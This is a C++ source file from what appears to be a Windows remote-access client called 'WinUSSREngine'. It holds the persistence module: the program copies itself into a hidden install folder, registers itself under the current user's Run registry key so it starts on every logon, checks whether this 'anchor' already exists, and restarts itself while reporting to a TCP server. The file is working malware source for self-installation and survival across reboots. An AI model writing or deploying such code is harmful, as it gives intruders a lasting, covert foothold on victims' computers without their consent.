#include "BasicPersist.h"
#include "WinUSSREngine/Network/ClientTCP.h"
#include "WinUSSREngine/Base/TCPBase/PacketType.h"
#include "WinUSSREngine/Base/Config.h"
#include "WinUSSREngine/Base/Utility.h"

namespace WinUSSREngine
{
	void BasicPersist::InitClientAnchor()
	{
		m_Data.currentPath = GetCurrentPath();
		m_Data.installFolder = GetInstallFolder();
		m_Data.installPath = GetInstallPath();
	}

	void BasicPersist::Create() { InitClientAnchor(); }

	void BasicPersist::RestartClientApp()
	{
		TCP::Client::GetClient().sendStringMsg("Restart Request: Restarting self!", TCP::PacketType::Warning);
		StartProcess(m_Data.currentPath.c_str(), NULL);
		config->Flags.DestroyAllThreads = true;
	}

	void BasicPersist::InstallClientAnchor()
	{
		if (!Utility::DirectoryExists(m_Data.installFolder.c_str()))
			if (!CreateDirectory(m_Data.installFolder.c_str(), NULL))	//tries to create folder		
			{
				//[MAYBE DO SOMETHING LATER IF IT FAILS - PERHAPS REROUTE INSTALL TO APPDATA]
			}
		CopyFile(m_Data.currentPath.c_str(), m_Data.installPath.c_str(), 0);
	}

	void BasicPersist::StartProcess(LPCSTR lpAppName, LPSTR lpArg)
	{
		// additional information
		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		// set the size of the structures
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		// start the program up
		CreateProcess(lpAppName,   // the path
			lpArg,        // Command line
			NULL,           // Process handle not inheritable
			NULL,           // Thread handle not inheritable
			FALSE,          // Set handle inheritance to FALSE
			0,              // No creation flags
			NULL,           // Use parent's environment block
			NULL,           // Use parent's starting directory 
			&si,            // Pointer to STARTUPINFO structure
			&pi);           // Pointer to PROCESS_INFORMATION structure
		// Close process and thread handles. 
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	bool BasicPersist::SetAppStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
	{
		HKEY hKey = NULL;
		LONG lResult = 0;
		bool fSuccess;			//TEMP CHANGE, OLD: BOOL fSuccess = TRUE;
		DWORD dwSize;

		const size_t count = MAX_PATH * 2;
		wchar_t szValue[count] = {};


		wcscpy_s(szValue, count, L"\"");
		wcscat_s(szValue, count, pathToExe);
		wcscat_s(szValue, count, L"\" ");

		if (args != NULL)
		{
			// caller should make sure "args" is quoted if any single argument has a space
			// e.g. (L"-name \"Mark Voidale\"");
			wcscat_s(szValue, count, args);
		}

		lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

		fSuccess = (lResult == 0);

		if (fSuccess)
		{
			dwSize = (wcslen(szValue) + 1) * 2;
			lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
			fSuccess = (lResult == 0);
		}

		if (hKey != NULL)
		{
			RegCloseKey(hKey);
			hKey = NULL;
		}

		return fSuccess;
	}

	std::string BasicPersist::GetCurrentPath()
	{
		char buf[MAX_PATH];
		GetModuleFileName(0, buf, MAX_PATH);
		return std::string(buf);
	}

	void BasicPersist::RunInstalledClient()
	{
		if (!config->AppConfig.IsInstallSelf) return;
		if (config->AppConfig.IsStartOnReboot) return;

		StartProcess(m_Data.installPath.c_str(), nullptr);
	}

	bool BasicPersist::IsClientAnchored()
	{

		return RegValueExists(HKEY_CURRENT_USER, config->AppConfig.RegPath.c_str(), config->AppConfig.Strings[3].c_str()) == true ? true : false;
	}

	bool BasicPersist::RegValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName)
	{
		DWORD dwType = 0;
		long lResult = 0;
		HKEY hKeyPlaceholder = NULL;
		lResult = RegOpenKeyEx(hKey, keyPath, NULL, KEY_READ, &hKeyPlaceholder);
		if (lResult == ERROR_SUCCESS)
		{
			lResult = RegQueryValueEx(hKeyPlaceholder, valueName, NULL, &dwType, NULL, NULL);

			if (lResult == ERROR_SUCCESS)
			{
				return true;
			}
		}
		return false;
	}

	std::string BasicPersist::GetInstallFolder()
	{
		std::string rest = "";
		if (!(config->AppConfig.Strings[2] == ""))
			rest = "\\" + config->AppConfig.Strings[2];

		std::string concat;
		char* buf = 0;
		size_t sz = 0;
		if (_dupenv_s(&buf, &sz, config->AppConfig.Strings[0].c_str()) == 0) //gets environment variable
			if (buf != NULL)
			{
				concat = std::string(buf) + rest; //concatenates string
				free(buf);
			}

		return concat;
	}

	std::string BasicPersist::GetInstallPath()
	{
		std::string concat;
		concat = m_Data.installFolder + "\\" + config->AppConfig.Strings[1];

		return concat;
	}
}